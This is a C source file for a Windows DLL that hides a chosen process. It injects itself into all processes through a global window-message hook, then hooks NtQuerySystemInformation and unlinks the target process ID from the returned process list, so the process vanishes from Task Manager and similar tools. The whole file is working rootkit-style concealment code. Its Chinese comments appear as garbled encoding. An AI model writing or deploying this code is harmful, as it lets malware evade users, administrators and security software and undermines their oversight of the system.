#include <windows.h>
#pragma hdrstop

#include <Winnt.h>
#include <winbase.h>
#include <stdio.h>
#include <Tlhelp32.h>

#define _DLL_
#include "HookApi.h"

#include "HookClass.h"

//---------------------------------------------------------------------------

//NtQuerySystemInformation

typedef struct _THREAD_INFO
{
  LARGE_INTEGER KernelTime;
  LARGE_INTEGER UserTime;
  LARGE_INTEGER CreateTime;
  ULONG WaitTime;
  DWORD dwStartAddress;
  DWORD dwOwnerPID;
  DWORD dwThreadId;
  DWORD dwCurrentPriority;
  DWORD dwBasePriority;
  DWORD dwContextSwitches;
  DWORD dwThreadState;
  DWORD dwWaitReason;
  DWORD dwReserved;

}THREADINFO, *PTHREADINFO;

typedef struct _UNICODE_STRING
{
  USHORT Length;
  USHORT MaxLength;
  PWSTR  Buffer;

} UNICODE_STRING;

typedef struct _PROCESS_INFO
{
  DWORD dwOffset;
  DWORD dwThreadsCount;
  DWORD dwUnused1[6];
  LARGE_INTEGER CreateTime;
  LARGE_INTEGER UserTime;
  LARGE_INTEGER KernelTime;
  UNICODE_STRING ProcessName;

  DWORD dwBasePriority;
  DWORD dwProcessID;
  DWORD dwParentProcessId;
  DWORD dwHandleCount;
  DWORD dwUnused3[2];

  DWORD dwVirtualBytesPeak;
  DWORD dwVirtualBytes;
  ULONG  dwPageFaults;
  DWORD dwWorkingSetPeak;
  DWORD dwWorkingSet;
  DWORD dwQuotaPeakPagedPoolUsage;
  DWORD dwQuotaPagedPoolUsage;
  DWORD dwQuotaPeakNonPagedPoolUsage;
  DWORD dwQuotaNonPagedPoolUsage;
  DWORD dwPageFileUsage;
  DWORD dwPageFileUsagePeak;

  DWORD      dCommitCharge;
  THREADINFO ThreadSysInfo[1];

} PROCESSINFO, *PPROCESSINFO;

typedef long (__stdcall *PNTQUERYSYSTEMINFORMATION)(DWORD,PVOID,ULONG,PULONG);

long __stdcall MyNtQuerySystemInformation(
  DWORD SysInformatoinClass,
  PVOID SystemInformation,          
  ULONG SystemInformationLength,
  PULONG ReturnLength OPTIONAL);

TAPIHook *NtQuerySystemInformationHook = NULL;

//---------------------------------------------------------------------------

//HHOOK hCallWndHook = NULL;

LRESULT CALLBACK CallWndHook(int nCode,WPARAM wParam,LPARAM lParam);

//---------------------------------------------------------------------------
//���ֵֻ��������SetWindowsHookEx
HINSTANCE hInst;

#pragma data_seg("SHAREDATA")

HHOOK hCallWndHook = NULL;
DWORD dwSelfProcessID = -1;

#pragma data_seg()

#pragma comment(linker,"/section:SHAREDATA,RWS")


//Ϊ����Ҫ��DLLһ�������Զ�Hook��GetProcAddress��LoadLibraryA��LoadLibraryW��
//LoadLibraryExA��LoadLibraryExW��5����������HookClass.Cpp����������Unhook֮��
//���DLL���ڱ�Ľ�����ж�أ����Ƕ��ڱ�������˵��DLL��û������ж�أ������Ǽ���
//Hook��Ȼ�����ã�Ϊ��ʵ�����������ϵ�Unohok�������������־�����Ǽ���Hook���
//����������־���Ա����Ƿ����Hook��
bool IsHook = false;

//����ʵ�ʵ�Hook����
int __fastcall HookFunc();
int __fastcall UnhookFunc();

//---------------------------------------------------------------------------
//#pragma argsused

BOOL APIENTRY DllMain( HANDLE hModule, DWORD  reason, LPVOID lpReserved)
{
  hInst = (HINSTANCE)hModule;	 

  if(reason == DLL_PROCESS_ATTACH)
  {
    DisableThreadLibraryCalls(hInst);

    __try
    {
      if(dwSelfProcessID != -1)
        HookFunc();
    }
    __except(EXCEPTION_EXECUTE_HANDLER)
    {/* Do nothing */}
  }
  else if(reason == DLL_PROCESS_DETACH)
  {
    __try
    {
      UnhookFunc();             
    }
    __except(EXCEPTION_EXECUTE_HANDLER)
    {/* Do nothing */}
  }

  return TRUE;
}
//---------------------------------------------------------------------------
//Hook
DLL_EXP_IMP int _cdecl Hook(DWORD dwSelfProcessID_P)
{                          
  dwSelfProcessID = dwSelfProcessID_P;

  if(hCallWndHook == NULL)
    hCallWndHook = SetWindowsHookEx(WH_CALLWNDPROC,(HOOKPROC)CallWndHook,hInst,0);

  // Hookָ���ĺ���
  HookFunc();

  return 1;
}
//---------------------------------------------------------------------------
//Unhook
DLL_EXP_IMP int _cdecl Unhook()
{
  if(hCallWndHook != NULL)
  {
    UnhookWindowsHookEx(hCallWndHook);
    hCallWndHook = NULL;
  }

  // Unhookָ���ĺ���
  UnhookFunc();
  
  return 1;
}           
//---------------------------------------------------------------------------
int __fastcall HookFunc()
{
  IsHook = true;

  SetThreadPriority(GetCurrentThread(),THREAD_PRIORITY_TIME_CRITICAL);
  
  NtQuerySystemInformationHook = new TAPIHook("NTDLL.DLL","NtQuerySystemInformation",
    					      (PROC)MyNtQuerySystemInformation,true);

  SetThreadPriority(GetCurrentThread(),THREAD_PRIORITY_NORMAL);
  return 1;
}
//---------------------------------------------------------------------------
int __fastcall UnhookFunc()
{
  //������������ͨ�������־���Ա�֤��û���˳��������ʱ��Ҳ��Unhook��
  IsHook = false;

  if(NtQuerySystemInformationHook != NULL)
  {
    delete NtQuerySystemInformationHook;
    NtQuerySystemInformationHook = NULL;
  }
  return 1;
}
//---------------------------------------------------------------------------
//��ϢHook�������κ��£�ֻ��Ϊ�˼���DLL����Ľ���
LRESULT CALLBACK CallWndHook(int nCode,WPARAM wParam,LPARAM lParam)
{
  if(nCode < 0)
    return CallNextHookEx(hCallWndHook,nCode,wParam,lParam);

  // Do nothing
  return 0;               
}
//---------------------------------------------------------------------------
/*---------------------------------------------------------------------------

                         �Զ���ĺ�������

//-------------------------------------------------------------------------*/
//---------------------------------------------------------------------------

long __stdcall MyNtQuerySystemInformation(
  DWORD SysInformatoinClass,
  PVOID SystemInformation,          
  ULONG SystemInformationLength,
  PULONG ReturnLength OPTIONAL)
{
  long Result;

  Result = ((PNTQUERYSYSTEMINFORMATION)(PROC)(*NtQuerySystemInformationHook))
  	       (SysInformatoinClass,SystemInformation,SystemInformationLength,ReturnLength);

  //һ��Ҫʹ�ýṹ���쳣����������п��ܳ����쳣�Ի���
  __try
  {
    if(SysInformatoinClass == 5 && Result == 0 /* STATUS_SUCCESS */)
    {
      PPROCESSINFO pProcessInfo;
      PPROCESSINFO pPrevProcessInfo;

      pProcessInfo = (PPROCESSINFO)SystemInformation;
      pPrevProcessInfo = pProcessInfo;

      while(true)
      {
        if(pProcessInfo != NULL && pProcessInfo->dwProcessID == dwSelfProcessID)
        {
          if(pProcessInfo->dwOffset == 0)
            pPrevProcessInfo->dwOffset = 0;
          else
            pPrevProcessInfo->dwOffset = pPrevProcessInfo->dwOffset + pProcessInfo->dwOffset;

          break;
        }

        if(pProcessInfo->dwOffset == 0)
          break;

        pPrevProcessInfo = pProcessInfo;
        pProcessInfo = (PPROCESSINFO)((byte*)pProcessInfo + pProcessInfo->dwOffset);
      }
    }
  }
  __except(EXCEPTION_EXECUTE_HANDLER)
  {
    /*/ �����쳣�����ǲ������κ���
    ::MessageBox(NULL,"Exception Occured at self-defined function :(",NULL,MB_OK | MB_ICONWARNING);
    //*/
  }

  return Result;
}
//---------------------------------------------------------------------------
